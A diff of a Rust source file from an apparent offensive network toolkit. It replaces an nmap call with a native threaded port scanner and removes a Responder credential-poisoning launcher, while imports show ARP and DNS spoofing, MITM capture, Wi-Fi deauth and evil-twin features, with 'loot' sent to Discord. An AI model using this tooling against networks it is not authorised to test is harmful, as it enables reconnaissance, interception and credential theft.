@@ -1,7 +1,8 @@
 use std::{
+    collections::{HashMap, VecDeque},
     fs,
-    io::{BufRead, BufReader, Write},
-    net::Ipv4Addr,
+    io::Write,
+    net::{Ipv4Addr, SocketAddr, ToSocketAddrs},
     path::{Path, PathBuf},
     process::Command,
     time::{Duration, SystemTime, UNIX_EPOCH},
@@ -12,8 +13,8 @@ use chrono::Local;
 use ipnet::Ipv4Net;
 use regex::Regex;
 use rustyjack_ethernet::{
-    build_device_inventory, discover_hosts, discover_hosts_arp, quick_port_scan, DeviceInfo,
-    LanDiscoveryResult,
+    build_device_inventory, connect_tcp_with_source, discover_hosts, discover_hosts_arp,
+    quick_port_scan, DeviceInfo, LanDiscoveryResult,
 };
 use rustyjack_evasion::{
     MacAddress, MacManager, MacMode, MacPolicyConfig, MacPolicyEngine, MacStage, StableScope,
@@ -33,7 +34,7 @@ use crate::cli::{
     EthernetInventoryArgs, EthernetPortScanArgs, EthernetSiteCredArgs, HardwareCommand,
     HotspotCommand, HotspotStartArgs, LootCommand, LootKind, LootListArgs, LootReadArgs,
     MitmCommand, MitmStartArgs, NotifyCommand, ProcessCommand, ProcessKillArgs, ProcessStatusArgs,
-    ResponderArgs, ResponderCommand, ReverseCommand, ReverseLaunchArgs, ScanCommand, ScanRunArgs,
+    ReverseCommand, ReverseLaunchArgs, ScanCommand, ScanDiscovery, ScanRunArgs,
     StatusCommand, SystemCommand, SystemFdeMigrateArgs, SystemFdePrepareArgs, SystemUpdateArgs,
     WifiBestArgs, WifiCommand, WifiCrackArgs, WifiDeauthArgs, WifiDisconnectArgs, WifiEvilTwinArgs,
     WifiKarmaArgs, WifiPmkidArgs, WifiProbeSniffArgs, WifiProfileCommand, WifiProfileConnectArgs,
@@ -45,20 +46,21 @@ use crate::cli::{
 #[cfg(target_os = "linux")]
 use crate::netlink_helpers::netlink_set_interface_up;
 use crate::system::{
-    append_payload_log, backup_repository, backup_routing_state, build_loot_path,
+    append_payload_log, backup_repository, backup_routing_state, build_scan_loot_path,
     build_manual_embed, build_mitm_pcap_path, compose_status_text, connect_wifi_network,
     default_gateway_ip, delete_wifi_profile, detect_ethernet_interface, detect_interface,
-    disconnect_wifi_interface, enable_ip_forwarding, enforce_single_interface,
+    disconnect_wifi_interface, dns_spoof_running, enable_ip_forwarding, enforce_single_interface,
     find_interface_by_mac, git_reset_to_remote, interface_gateway, kill_process,
     kill_process_pattern, list_interface_summaries, list_wifi_profiles, load_wifi_profile,
-    log_mac_usage, ping_host, process_running_exact, process_running_pattern, randomize_hostname,
+    log_mac_usage, pcap_capture_running, ping_host, process_running_exact, randomize_hostname,
     read_default_route, read_discord_webhook, read_dns_servers, read_interface_preference,
     read_interface_preference_with_mac, read_interface_stats, read_wifi_link_info,
-    restart_system_service, restore_routing_state, rewrite_dns_servers, rewrite_ettercap_dns,
+    restart_system_service, restore_routing_state, rewrite_dns_servers,
     sanitize_label, save_wifi_profile, scan_local_hosts, scan_wifi_networks, select_best_interface,
     select_wifi_interface, send_discord_payload, send_scan_to_discord, set_default_route,
-    set_interface_metric, spawn_arpspoof_pair, start_bridge_pair, start_ettercap, start_php_server,
-    start_tcpdump_capture, stop_bridge_pair, strip_nmap_header, write_interface_preference,
+    set_interface_metric, spawn_arpspoof_pair, start_bridge_pair, start_dns_spoof, start_pcap_capture,
+    start_php_server, stop_arp_spoof, stop_bridge_pair, stop_dns_spoof, stop_pcap_capture,
+    arp_spoof_running, write_interface_preference,
     write_wifi_profile, HostInfo, KillResult, WifiProfile,
 };
 
@@ -108,10 +110,6 @@ pub fn dispatch_command(root: &Path, command: Commands) -> Result<HandlerResult>
         Commands::Notify(NotifyCommand::Discord(sub)) => match sub {
             DiscordCommand::Send(args) => handle_discord_send(root, args),
             DiscordCommand::Status => handle_discord_status(root),
-        },
-        Commands::Responder(sub) => match sub {
-            ResponderCommand::On(args) => handle_responder_on(root, args),
-            ResponderCommand::Off => handle_responder_off(),
         },
         Commands::Mitm(sub) => match sub {
             MitmCommand::Start(args) => handle_mitm_start(root, args),
@@ -632,6 +630,53 @@ fn handle_hotspot_status() -> Result<HandlerResult> {
     }
 }
 
+const DEFAULT_SCAN_PORTS: &[u16] = &[
+    20, 21, 22, 23, 25, 26, 37, 53, 67, 68, 69, 79, 80, 81, 82, 83, 84, 85, 88, 110, 111, 113,
+    119, 123, 135, 137, 138, 139, 143, 161, 162, 179, 199, 389, 443, 445, 465, 514, 515, 543,
+    544, 548, 554, 587, 631, 636, 873, 902, 989, 990, 993, 995, 1025, 1026, 1027, 1028, 1029,
+    1030, 1110, 1433, 1720, 1723, 1755, 1900, 2000, 2001, 2002, 2049, 2082, 2083, 2100, 2222,
+    2301, 2381, 2483, 2484, 3128, 3306, 3389, 3690, 4444, 4567, 5000, 5001, 5060, 5061, 5432,
+    5631, 5900, 5985, 5986, 6000, 6001, 6379, 6667, 7001, 7002, 8000, 8008, 8009, 8080, 8081,
+    8086, 8088, 8443, 8888, 9000, 9001, 9090, 9200, 9300, 9418, 9999, 10000, 11211, 27017,
+];
+
+#[derive(Debug, Clone)]
+struct ScanConfig {
+    ports: Vec<u16>,
+    timeout: Duration,
+    discovery: ScanDiscovery,
+    no_discovery: bool,
+    no_port_scan: bool,
+    service_detect: bool,
+    os_detect: bool,
+    workers: usize,
+    max_hosts: Option<usize>,
+    arp_rate_pps: Option<u32>,
+    warnings: Vec<String>,
+    scan_mode: &'static str,
+}
+
+#[derive(Debug, Clone)]
+struct HostDiscovery {
+    ip: Ipv4Addr,
+    ttl: Option<u8>,
+    arp: bool,
+    icmp: bool,
+}
+
+#[derive(Debug, Clone)]
+struct HostScanResult {
+    host: HostDiscovery,
+    port_scan: Option<rustyjack_ethernet::PortScanResult>,
+    errors: Vec<String>,
+}
+
+#[derive(Debug, Clone)]
+enum ScanTarget {
+    Network(Ipv4Net),
+    Hosts(Vec<Ipv4Addr>),
+}
+
 pub fn run_scan_with_progress<F>(
     root: &Path,
     args: ScanRunArgs,
@@ -640,85 +685,784 @@ pub fn run_scan_with_progress<F>(
 where
     F: FnMut(f32, &str),
 {
-    let ScanRunArgs {
-        label,
-        nmap_args,
-        interface,
-        target,
-        output_path,
-        no_discord,
-    } = args;
+    let label = args.label.clone();
+    let interface = args.interface.clone();
+    let target = args.target.clone();
+    let output_path = args.output_path.clone();
+    let no_discord = args.no_discord;
 
     let interface_info = detect_interface(interface)?;
-    let target = target.unwrap_or_else(|| interface_info.network_cidr());
+    enforce_single_interface(&interface_info.name)?;
+    let target_str = target.unwrap_or_else(|| interface_info.network_cidr());
+    let scan_target = parse_scan_target(&target_str)?;
+    let mut config = build_scan_config(&args)?;
+    apply_nmap_compat_args(&args.nmap_args, &mut config)?;
+    if let Some(ref ports) = args.ports {
+        config.ports = parse_port_list(ports)?;
+    } else if let Some(limit) = args.top_ports {
+        if limit == 0 {
+            bail!("--top-ports must be greater than 0");
+        }
+        if limit > DEFAULT_SCAN_PORTS.len() {
+            config.warnings.push(format!(
+                "Requested top {} ports but only {} available",
+                limit,
+                DEFAULT_SCAN_PORTS.len()
+            ));
+            config.ports = top_ports(DEFAULT_SCAN_PORTS.len());
+        } else {
+            config.ports = top_ports(limit);
+        }
+    }
 
-    let loot_path = output_path.unwrap_or(build_loot_path(root, &label)?);
+    let loot_path = output_path.unwrap_or(build_scan_loot_path(root, &label)?);
     if let Some(parent) = loot_path.parent() {
         std::fs::create_dir_all(parent).context("creating loot directory")?;
     }
 
-    let mut cmd = std::process::Command::new("nmap");
-    if !nmap_args.is_empty() {
-        cmd.args(&nmap_args);
-    }
+    on_progress(0.0, "Preparing");
 
-    // Add stats-every to get progress updates
-    cmd.arg("--stats-every").arg("1s");
-
-    cmd.arg("-oN")
-        .arg(&loot_path)
-        .arg("-S")
-        .arg(interface_info.address.to_string())
-        .arg("-e")
-        .arg(&interface_info.name)
-        .arg(&target)
-        .stdout(std::process::Stdio::piped())
-        .stderr(std::process::Stdio::null())
-        .stdin(std::process::Stdio::null());
-
-    let mut child = cmd.spawn().context("failed to launch nmap")?;
-
-    if let Some(stdout) = child.stdout.take() {
-        let reader = BufReader::new(stdout);
-        // Regex to match: "SYN Stealth Scan Timing: About 15.50% done"
-        let re_timing = Regex::new(r"(.*) Timing: About (\d+\.\d+)% done").unwrap();
-
-        for line in reader.lines() {
-            if let Ok(line) = line {
-                if let Some(caps) = re_timing.captures(&line) {
-                    if let (Some(task), Some(pct)) = (caps.get(1), caps.get(2)) {
-                        if let Ok(val) = pct.as_str().parse::<f32>() {
-                            on_progress(val, task.as_str().trim());
-                        }
-                    }
-                }
+    let (hosts, discovery_summary) = if config.no_discovery || matches!(config.discovery, ScanDiscovery::None) {
+        let hosts = expand_targets(&scan_target, config.max_hosts)?;
+        let summary = format!(
+            "Discovery skipped (-Pn). Targets: {}",
+            hosts.len()
+        );
+        (
+            hosts
+                .into_iter()
+                .map(|ip| HostDiscovery {
+                    ip,
+                    ttl: None,
+                    arp: false,
+                    icmp: false,
+                })
+                .collect::<Vec<_>>(),
+            summary,
+        )
+    } else {
+        let discovery = run_scan_discovery(
+            &interface_info.name,
+            &scan_target,
+            config.discovery,
+            config.arp_rate_pps,
+            config.timeout,
+        );
+        let mut hosts = discovery.0;
+        if let Some(limit) = config.max_hosts {
+            if hosts.len() > limit {
+                hosts.truncate(limit);
+                config
+                    .warnings
+                    .push(format!("Host list truncated to {} via --max-hosts", limit));
             }
         }
-    }
+        (hosts, discovery.1)
+    };
 
-    let status = child.wait().context("failed to wait for nmap")?;
-    if !status.success() {
-        bail!("nmap exited with status {}", status);
-    }
+    on_progress(20.0, "Discovery complete");
 
-    strip_nmap_header(&loot_path)?;
+    let results = if config.no_port_scan {
+        let entries = hosts
+            .into_iter()
+            .map(|host| HostScanResult {
+                host,
+                port_scan: None,
+                errors: Vec::new(),
+            })
+            .collect();
+        on_progress(100.0, "Discovery only");
+        entries
+    } else {
+        let ports = config.ports.clone();
+        if ports.is_empty() {
+            bail!("No ports selected for scan");
+        }
+        let worker_count = config
+            .workers
+            .clamp(1, 32)
+            .min(hosts.len().max(1));
+        let (scan_results, scan_errors) = scan_hosts(
+            &hosts,
+            &ports,
+            config.timeout,
+            interface_info.address,
+            config.service_detect,
+            worker_count,
+            |done, total| {
+                let pct = 20.0 + (done as f32 / total.max(1) as f32) * 80.0;
+                on_progress(pct, "Port scan");
+            },
+        );
+        merge_scan_results(hosts, scan_results, scan_errors)
+    };
+
+    let report = render_scan_report(
+        &interface_info.name,
+        interface_info.address,
+        &target_str,
+        &config,
+        &discovery_summary,
+        &results,
+    );
+    fs::write(&loot_path, report).with_context(|| format!("writing {}", loot_path.display()))?;
+
+    on_progress(100.0, "Completed");
 
     let mut discord_sent = false;
     if !no_discord {
         discord_sent =
-            send_scan_to_discord(root, &label, &loot_path, &target, &interface_info.name)?;
+            send_scan_to_discord(root, &label, &loot_path, &target_str, &interface_info.name)?;
     }
 
     let output_path_str = loot_path.to_string_lossy().to_string();
     let data = json!({
         "label": label,
         "interface": interface_info.name,
-        "target": target,
+        "target": target_str,
         "output_path": output_path_str,
         "discord_notified": discord_sent,
     });
 
-    Ok(("Nmap scan completed and loot saved".to_string(), data))
+    Ok(("Scan completed and loot saved".to_string(), data))
+}
+
+fn build_scan_config(args: &ScanRunArgs) -> Result<ScanConfig> {
+    let mut config = ScanConfig {
+        ports: Vec::new(),
+        timeout: Duration::from_millis(args.timeout_ms.max(50)),
+        discovery: args.discovery,
+        no_discovery: args.no_discovery,
+        no_port_scan: args.no_port_scan,
+        service_detect: args.service_detect,
+        os_detect: args.os_detect,
+        workers: args.workers,
+        max_hosts: args.max_hosts,
+        arp_rate_pps: args.arp_rate_pps,
+        warnings: Vec::new(),
+        scan_mode: "connect",
+    };
+
+    if let Some(ref ports) = args.ports {
+        config.ports = parse_port_list(ports)?;
+    } else if let Some(limit) = args.top_ports {
+        if limit == 0 {
+            bail!("--top-ports must be greater than 0");
+        }
+        if limit > DEFAULT_SCAN_PORTS.len() {
+            config.warnings.push(format!(
+                "Requested top {} ports but only {} available",
+                limit,
+                DEFAULT_SCAN_PORTS.len()
+            ));
+            config.ports = top_ports(DEFAULT_SCAN_PORTS.len());
+        } else {
+            config.ports = top_ports(limit);
+        }
+    } else {
+        config.ports = top_ports(DEFAULT_SCAN_PORTS.len());
+    }
+
+    Ok(config)
+}
+
+fn apply_nmap_compat_args(args: &[String], config: &mut ScanConfig) -> Result<()> {
+    let mut iter = args.iter().peekable();
+    while let Some(arg) = iter.next() {
+        match arg.as_str() {
+            "-sV" => config.service_detect = true,
+            "-O" => config.os_detect = true,
+            "-sn" => config.no_port_scan = true,
+            "-Pn" => config.no_discovery = true,
+            "-F" => config.ports = top_ports(100),
+            "-sS" | "-sT" => {
+                config.scan_mode = "connect";
+                config
+                    .warnings
+                    .push(format!("Requested {} but using TCP connect scan", arg));
+            }
+            "-p" => {
+                if let Some(value) = iter.next() {
+                    config.ports = parse_port_list(value)?;
+                } else {
+                    bail!("Missing value for -p");
+                }
+            }
+            value if value.starts_with("-p") && value.len() > 2 => {
+                config.ports = parse_port_list(&value[2..])?;
+            }
+            "--top-ports" => {
+                if let Some(value) = iter.next() {
+                    let count = value.parse::<usize>().context("parsing --top-ports")?;
+                    if count == 0 {
+                        bail!("--top-ports must be greater than 0");
+                    }
+                    if count > DEFAULT_SCAN_PORTS.len() {
+                        config.warnings.push(format!(
+                            "Requested top {} ports but only {} available",
+                            count,
+                            DEFAULT_SCAN_PORTS.len()
+                        ));
+                        config.ports = top_ports(DEFAULT_SCAN_PORTS.len());
+                    } else {
+                        config.ports = top_ports(count);
+                    }
+                } else {
+                    bail!("Missing value for --top-ports");
+                }
+            }
+            value if value.starts_with("--top-ports=") => {
+                let count = value["--top-ports=".len()..]
+                    .parse::<usize>()
+                    .context("parsing --top-ports")?;
+                if count == 0 {
+                    bail!("--top-ports must be greater than 0");
+                }
+                if count > DEFAULT_SCAN_PORTS.len() {
+                    config.warnings.push(format!(
+                        "Requested top {} ports but only {} available",
+                        count,
+                        DEFAULT_SCAN_PORTS.len()
+                    ));
+                    config.ports = top_ports(DEFAULT_SCAN_PORTS.len());
+                } else {
+                    config.ports = top_ports(count);
+                }
+            }
+            value if value.starts_with("-T") && value.len() == 3 => {
+                let level = value.chars().last().unwrap();
+                apply_timing(level, config);
+            }
+            "--stats-every" => {
+                let _ = iter.next();
+            }
+            other => {
+                config
+                    .warnings
+                    .push(format!("Unsupported nmap flag ignored: {}", other));
+            }
+        }
+    }
+    Ok(())
+}
+
+fn apply_timing(level: char, config: &mut ScanConfig) {
+    match level {
+        '0' => {
+            config.timeout = Duration::from_millis(2000);
+            config.workers = 1;
+        }
+        '1' => {
+            config.timeout = Duration::from_millis(1500);
+            config.workers = 1;
+        }
+        '2' => {
+            config.timeout = Duration::from_millis(1000);
+            config.workers = config.workers.min(2).max(1);
+        }
+        '3' => {
+            config.timeout = Duration::from_millis(600);
+            config.workers = config.workers.max(4);
+        }
+        '4' => {
+            config.timeout = Duration::from_millis(400);
+            config.workers = config.workers.max(6);
+        }
+        '5' => {
+            config.timeout = Duration::from_millis(200);
+            config.workers = config.workers.max(8);
+        }
+        _ => {}
+    }
+}
+
+fn parse_scan_target(target: &str) -> Result<ScanTarget> {
+    if target.contains('/') {
+        let net: Ipv4Net = target.parse().context("parsing target CIDR")?;
+        return Ok(ScanTarget::Network(net));
+    }
+    if target.contains(',') {
+        let mut hosts = Vec::new();
+        for part in target.split(',') {
+            let ip: Ipv4Addr = part.trim().parse().context("parsing target IP")?;
+            hosts.push(ip);
+        }
+        return Ok(ScanTarget::Hosts(hosts));
+    }
+    let ip: Ipv4Addr = target.parse().context("parsing target IP")?;
+    Ok(ScanTarget::Hosts(vec![ip]))
+}
+
+fn expand_targets(target: &ScanTarget, max_hosts: Option<usize>) -> Result<Vec<Ipv4Addr>> {
+    match target {
+        ScanTarget::Hosts(hosts) => {
+            if let Some(limit) = max_hosts {
+                Ok(hosts.iter().cloned().take(limit).collect())
+            } else {
+                Ok(hosts.clone())
+            }
+        }
+        ScanTarget::Network(net) => {
+            let host_count = ipv4_host_count(*net);
+            if max_hosts.is_none() && host_count > 4096 {
+                bail!(
+                    "Target {} expands to {} hosts. Use --max-hosts to limit or enable discovery.",
+                    net,
+                    host_count
+                );
+            }
+            let mut hosts = Vec::new();
+            for ip in net.hosts() {
+                hosts.push(ip);
+                if let Some(limit) = max_hosts {
+                    if hosts.len() >= limit {
+                        break;
+                    }
+                }
+            }
+            Ok(hosts)
+        }
+    }
+}
+
+fn ipv4_host_count(net: Ipv4Net) -> u64 {
+    let host_bits = 32u32.saturating_sub(net.prefix_len().into());
+    match host_bits {
+        0 => 1,
+        1 => 2,
+        bits => (1u64 << bits).saturating_sub(2),
+    }
+}
+
+fn top_ports(limit: usize) -> Vec<u16> {
+    let mut ports = Vec::new();
+    for port in DEFAULT_SCAN_PORTS.iter().copied().take(limit) {
+        ports.push(port);
+    }
+    dedup_ports(&mut ports);
+    ports
+}
+
+fn parse_port_list(raw: &str) -> Result<Vec<u16>> {
+    let mut ports = Vec::new();
+    for part in raw.split(',') {
+        let part = part.trim();
+        if part.is_empty() {
+            continue;
+        }
+        if let Some((start, end)) = part.split_once('-') {
+            let start: u16 = start.trim().parse().context("parsing port range start")?;
+            let end: u16 = end.trim().parse().context("parsing port range end")?;
+            if start == 0 || end == 0 || end < start {
+                bail!("Invalid port range {}", part);
+            }
+            for port in start..=end {
+                ports.push(port);
+            }
+        } else {
+            let port: u16 = part.parse().context("parsing port")?;
+            if port == 0 {
+                bail!("Invalid port 0");
+            }
+            ports.push(port);
+        }
+    }
+    dedup_ports(&mut ports);
+    Ok(ports)
+}
+
+fn dedup_ports(ports: &mut Vec<u16>) {
+    ports.sort_unstable();
+    ports.dedup();
+}
+
+fn run_scan_discovery(
+    interface: &str,
+    target: &ScanTarget,
+    mode: ScanDiscovery,
+    arp_rate_pps: Option<u32>,
+    timeout: Duration,
+) -> (Vec<HostDiscovery>, String) {
+    let mut details = Vec::new();
+    match target {
+        ScanTarget::Network(net) => {
+            if matches!(mode, ScanDiscovery::Arp | ScanDiscovery::Both) {
+                if let Ok(arp_result) = run_arp_discovery(interface, *net, arp_rate_pps, timeout) {
+                    details.extend(arp_result.details);
+                }
+            }
+            if matches!(mode, ScanDiscovery::Icmp | ScanDiscovery::Both) {
+                if let Ok(icmp_result) = discover_hosts(*net, timeout) {
+                    details.extend(icmp_result.details);
+                }
+            }
+        }
+        ScanTarget::Hosts(hosts) => {
+            for ip in hosts {
+                let net = match Ipv4Net::new(*ip, 32) {
+                    Ok(n) => n,
+                    Err(_) => continue,
+                };
+                if matches!(mode, ScanDiscovery::Arp | ScanDiscovery::Both) {
+                    if let Ok(arp_result) = run_arp_discovery(interface, net, arp_rate_pps, timeout) {
+                        details.extend(arp_result.details);
+                    }
+                }
+                if matches!(mode, ScanDiscovery::Icmp | ScanDiscovery::Both) {
+                    if let Ok(icmp_result) = discover_hosts(net, timeout) {
+                        details.extend(icmp_result.details);
+                    }
+                }
+            }
+        }
+    }
+
+    let mut map: HashMap<Ipv4Addr, HostDiscovery> = HashMap::new();
+    for item in details {
+        let entry = map.entry(item.ip).or_insert(HostDiscovery {
+            ip: item.ip,
+            ttl: None,
+            arp: false,
+            icmp: false,
+        });
+        match item.method {
+            rustyjack_ethernet::DiscoveryMethod::Arp => entry.arp = true,
+            rustyjack_ethernet::DiscoveryMethod::Icmp => entry.icmp = true,
+        }
+        if item.ttl.is_some() {
+            entry.ttl = item.ttl;
+        }
+    }
+
+    let mut hosts: Vec<HostDiscovery> = map.into_values().collect();
+    hosts.sort_by_key(|h| h.ip);
+
+    let summary = format!(
+        "Discovery: {} host(s) found via {}",
+        hosts.len(),
+        match mode {
+            ScanDiscovery::Arp => "arp",
+            ScanDiscovery::Icmp => "icmp",
+            ScanDiscovery::Both => "arp+icmp",
+            ScanDiscovery::None => "none",
+        }
+    );
+    (hosts, summary)
+}
+
+fn scan_hosts<F>(
+    hosts: &[HostDiscovery],
+    ports: &[u16],
+    timeout: Duration,
+    source_ip: Ipv4Addr,
+    capture_banners: bool,
+    workers: usize,
+    mut on_progress: F,
+) -> (
+    HashMap<Ipv4Addr, rustyjack_ethernet::PortScanResult>,
+    HashMap<Ipv4Addr, String>,
+)
+where
+    F: FnMut(usize, usize),
+{
+    let queue: VecDeque<Ipv4Addr> = hosts.iter().map(|h| h.ip).collect();
+    let queue = std::sync::Arc::new(std::sync::Mutex::new(queue));
+    let ports = std::sync::Arc::new(ports.to_vec());
+    let (tx, rx) = std::sync::mpsc::channel();
+    let mut handles = Vec::new();
+    let total = hosts.len();
+    let worker_count = workers.clamp(1, 32).min(total.max(1));
+
+    for _ in 0..worker_count {
+        let queue = std::sync::Arc::clone(&queue);
+        let ports = std::sync::Arc::clone(&ports);
+        let tx = tx.clone();
+        let handle = std::thread::spawn(move || {
+            loop {
+                let ip = {
+                    let mut guard = queue.lock().ok()?;
+                    guard.pop_front()
+                };
+                let Some(ip) = ip else { break; };
+                let result = rustyjack_ethernet::quick_port_scan_with_source(
+                    ip,
+                    &ports,
+                    timeout,
+                    source_ip,
+                    capture_banners,
+                );
+                let _ = tx.send((ip, result));
+            }
+            Some(())
+        });
+        handles.push(handle);
+    }
+
+    drop(tx);
+    let mut done = 0usize;
+    let mut results = HashMap::new();
+    let mut errors = HashMap::new();
+    for received in rx {
+        done += 1;
+        if let (ip, Ok(scan)) = received {
+            results.insert(ip, scan);
+        } else if let (ip, Err(err)) = received {
+            errors.insert(ip, err.to_string());
+        }
+        on_progress(done, total);
+    }
+
+    for handle in handles {
+        let _ = handle.join();
+    }
+
+    (results, errors)
+}
+
+fn merge_scan_results(
+    hosts: Vec<HostDiscovery>,
+    scans: HashMap<Ipv4Addr, rustyjack_ethernet::PortScanResult>,
+    errors: HashMap<Ipv4Addr, String>,
+) -> Vec<HostScanResult> {
+    let mut results = Vec::new();
+    for host in hosts {
+        let mut host_errors = Vec::new();
+        let ip = host.ip;
+        if let Some(err) = errors.get(&ip) {
+            host_errors.push(err.clone());
+        }
+        let port_scan = scans.get(&ip).cloned();
+        results.push(HostScanResult {
+            host,
+            port_scan,
+            errors: host_errors,
+        });
+    }
+    results
+}
+
+fn render_scan_report(
+    interface: &str,
+    source_ip: Ipv4Addr,
+    target: &str,
+    config: &ScanConfig,
+    discovery_summary: &str,
+    results: &[HostScanResult],
+) -> String {
+    let mut out = String::new();
+    out.push_str("Rustyjack Scan Report\n");
+    out.push_str(&format!(
+        "Timestamp: {}\n",
+        Local::now().format("%Y-%m-%d %H:%M:%S")
+    ));
+    out.push_str(&format!("Interface: {} ({})\n", interface, source_ip));
+    out.push_str(&format!("Target: {}\n", target));
+    out.push_str(&format!("Scan mode: TCP {} scan\n", config.scan_mode));
+    out.push_str(&format!("Timeout per port: {:?}\n", config.timeout));
+    out.push_str(&format!("Ports scanned: {} total\n", config.ports.len()));
+    out.push_str(&format!(
+        "Service detection: {}\n",
+        if config.service_detect { "enabled" } else { "disabled" }
+    ));
+    out.push_str(&format!(
+        "OS detection: {}\n",
+        if config.os_detect { "enabled" } else { "disabled" }
+    ));
+    out.push_str(&format!("Discovery: {:?}\n", config.discovery));
+    out.push_str(&format!("{discovery_summary}\n"));
+
+    if !config.warnings.is_empty() {
+        out.push_str("\nWarnings:\n");
+        for warn in &config.warnings {
+            out.push_str(&format!("- {}\n", warn));
+        }
+    }
+
+    if results.is_empty() {
+        out.push_str("\nNo hosts discovered.\n");
+        return out;
+    }
+
+    for host in results {
+        out.push_str("\n-------------------------------\n");
+        out.push_str(&format!("Scan report for {}\n", host.host.ip));
+        let method = match (host.host.arp, host.host.icmp) {
+            (true, true) => "arp+icmp",
+            (true, false) => "arp",
+            (false, true) => "icmp",
+            (false, false) => "assumed",
+        };
+        out.push_str(&format!("Host is up ({})\n", method));
+        if config.os_detect {
+            if let Some(ttl) = host.host.ttl {
+                let os_guess = rustyjack_ethernet::guess_os_from_ttl(Some(ttl))
+                    .unwrap_or("unknown");
+                out.push_str(&format!("TTL: {} (OS guess: {})\n", ttl, os_guess));
+            } else {
+                out.push_str("TTL: unknown\n");
+            }
+        }
+        if let Some(scan) = &host.port_scan {
+            let open_count = scan.open_ports.len();
+            let closed = config.ports.len().saturating_sub(open_count);
+            if open_count == 0 {
+                out.push_str(&format!(
+                    "All {} scanned ports are closed\n",
+                    config.ports.len()
+                ));
+            } else {
+                out.push_str("PORT     STATE SERVICE INFO\n");
+                let banner_map = build_banner_map(&scan.banners);
+                for port in &scan.open_ports {
+                    let service = service_name(*port);
+                    let info = if config.service_detect {
+                        banner_map
+                            .get(port)
+                            .map(|b| truncate_scan_info(&b.banner, 60))
+                            .unwrap_or_else(|| "".to_string())
+                    } else {
+                        "".to_string()
+                    };
+                    out.push_str(&format!(
+                        "{:>5}/tcp open  {:<7} {}\n",
+                        port,
+                        service,
+                        info
+                    ));
+                }
+                out.push_str(&format!(
+                    "Not shown: {} closed ports\n",
+                    closed
+                ));
+            }
+        } else {
+            out.push_str("Port scan skipped (-sn)\n");
+        }
+        if !host.errors.is_empty() {
+            out.push_str("Errors:\n");
+            for err in &host.errors {
+                out.push_str(&format!("- {}\n", err));
+            }
+        }
+    }
+
+    out
+}
+
+fn build_banner_map(
+    banners: &[rustyjack_ethernet::PortBanner],
+) -> HashMap<u16, rustyjack_ethernet::PortBanner> {
+    let mut map = HashMap::new();
+    for banner in banners {
+        map.insert(banner.port, banner.clone());
+    }
+    map
+}
+
+fn truncate_scan_info(input: &str, max: usize) -> String {
+    let trimmed = input.trim();
+    if trimmed.len() <= max {
+        return trimmed.to_string();
+    }
+    let mut out = String::new();
+    for (idx, ch) in trimmed.chars().enumerate() {
+        if idx + 3 >= max {
+            break;
+        }
+        out.push(ch);
+    }
+    out.push_str("...");
+    out
+}
+
+fn service_name(port: u16) -> &'static str {
+    match port {
+        20 => "ftp",
+        21 => "ftp",
+        22 => "ssh",
+        23 => "telnet",
+        25 => "smtp",
+        26 => "smtp",
+        53 => "dns",
+        67 => "dhcp",
+        68 => "dhcp",
+        69 => "tftp",
+        79 => "finger",
+        80 => "http",
+        81 | 82 | 83 | 84 | 85 => "http",
+        88 => "kerberos",
+        110 => "pop3",
+        111 => "rpc",
+        119 => "nntp",
+        123 => "ntp",
+        135 => "msrpc",
+        137 | 138 | 139 => "netbios",
+        143 => "imap",
+        161 => "snmp",
+        162 => "snmptrap",
+        179 => "bgp",
+        389 => "ldap",
+        443 => "https",
+        445 => "smb",
+        465 => "smtps",
+        514 => "syslog",
+        515 => "printer",
+        543 | 544 => "klogin",
+        548 => "afp",
+        554 => "rtsp",
+        587 => "smtp",
+        631 => "ipp",
+        636 => "ldaps",
+        873 => "rsync",
+        902 => "vmware",
+        989 | 990 => "ftps",
+        993 => "imaps",
+        995 => "pop3s",
+        1025..=1030 => "msrpc",
+        1110 => "pop3",
+        1433 => "mssql",
+        1720 => "h323",
+        1723 => "pptp",
+        1755 => "rtsp",
+        1900 => "ssdp",
+        2000..=2002 => "cisco",
+        2049 => "nfs",
+        2082 | 2083 => "cpanel",
+        2100 => "oracle",
+        2222 => "ssh",
+        2301 => "compaq",
+        2381 => "oracle",
+        2483 | 2484 => "oracle",
+        3128 => "proxy",
+        3306 => "mysql",
+        3389 => "rdp",
+        3690 => "svn",
+        4444 => "metasploit",
+        4567 => "distcc",
+        5000 | 5001 => "upnp",
+        5060 | 5061 => "sip",
+        5432 => "postgres",
+        5631 => "pcanywhere",
+        5900 => "vnc",
+        5985 | 5986 => "winrm",
+        6000 | 6001 => "x11",
+        6379 => "redis",
+        6667 => "irc",
+        7001 | 7002 => "weblogic",
+        8000 | 8008 | 8009 => "http",
+        8080 | 8081 | 8086 | 8088 => "http",
+        8443 => "https",
+        8888 => "http",
+        9000 | 9001 => "http",
+        9090 => "http",
+        9200 | 9300 => "elasticsearch",
+        9418 => "git",
+        9999 => "abyss",
+        10000 => "webmin",
+        11211 => "memcache",
+        27017 => "mongodb",
+        _ => "unknown",
+    }
 }
 
 fn handle_discord_send(root: &Path, args: DiscordSendArgs) -> Result<HandlerResult> {
@@ -762,58 +1506,6 @@ fn handle_discord_status(root: &Path) -> Result<HandlerResult> {
     Ok((message, data))
 }
 
-fn handle_responder_on(root: &Path, args: ResponderArgs) -> Result<HandlerResult> {
-    if process_running_pattern("Responder.py")? {
-        let data = json!({ "already_running": true });
-        return Ok(("Responder already running".to_string(), data));
-    }
-
-    let ResponderArgs { interface } = args;
-    let interface = match interface {
-        Some(name) => name,
-        None => detect_interface(None)?.name,
-    };
-
-    enforce_single_interface(&interface)?;
-
-    let responder_script = root.join("Responder/Responder.py");
-    if !responder_script.exists() {
-        bail!(
-            "Responder script not found at {}",
-            responder_script.display()
-        );
-    }
-
-    let mut cmd = std::process::Command::new("python3");
-    cmd.arg(&responder_script)
-        .arg("-Q")
-        .arg("-I")
-        .arg(&interface)
-        .stdin(std::process::Stdio::null())
-        .stdout(std::process::Stdio::null())
-        .stderr(std::process::Stdio::null());
-    cmd.spawn().context("launching Responder")?;
-
-    let data = json!({
-        "interface": interface,
-        "isolation_enforced": true,
-    });
-    Ok(("Responder started".to_string(), data))
-}
-
-fn handle_responder_off() -> Result<HandlerResult> {
-    match kill_process_pattern("Responder.py")? {
-        KillResult::Terminated => {
-            let data = json!({ "stopped": true });
-            Ok(("Responder stopped".to_string(), data))
-        }
-        KillResult::NotFound => {
-            let data = json!({ "stopped": false });
-            Ok(("Responder was not running".to_string(), data))
-        }
-    }
-}
-
 fn handle_mitm_start(root: &Path, args: MitmStartArgs) -> Result<HandlerResult> {
     let MitmStartArgs {
         interface,
